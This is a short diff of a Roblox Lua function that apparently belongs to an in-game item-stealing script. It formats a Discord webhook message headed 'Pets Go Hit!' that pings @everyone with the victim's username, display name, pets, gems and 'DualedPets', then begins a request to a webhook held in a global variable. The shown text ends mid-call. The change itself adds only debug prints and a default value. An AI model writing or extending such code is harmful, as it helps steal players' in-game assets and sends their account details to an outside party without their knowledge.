@@ -1,12 +1,14 @@
 return function(dh,pn,gn,dp)
 print(_G.wh)
-print(_G.whb)
+print(dh,pn,gn,dp)
+if not dp then dp = 0 end
 local msg = ""
 if dh then
 msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
 else
 msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
 end
+print(msg)
 local response =
         request(
         {
